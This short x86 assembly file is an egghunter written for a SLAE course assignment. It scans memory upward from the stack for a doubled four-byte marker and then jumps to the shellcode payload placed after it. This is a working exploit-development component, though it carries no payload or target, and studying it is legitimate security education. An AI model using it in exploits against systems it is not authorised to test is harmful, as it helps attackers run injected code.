; Filename: byte_crawling_egghunter.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 3

global _start

section .text

_start:
	mov eax, esp		; eax = esp
	mov ebx, 0x47904f90	; EGG = INC edi, NOP, DEC edi, NOP

search_egg:
	inc eax
	cmp [eax], ebx
	jne search_egg		; eax is not storing the EGG
	cmp [eax+4], ebx	; compare twice in order to reduce the chance of collision
	jne search_egg		; eax+4 is not storing the EGG

	jmp eax			; EGG is found and jmp to the payload
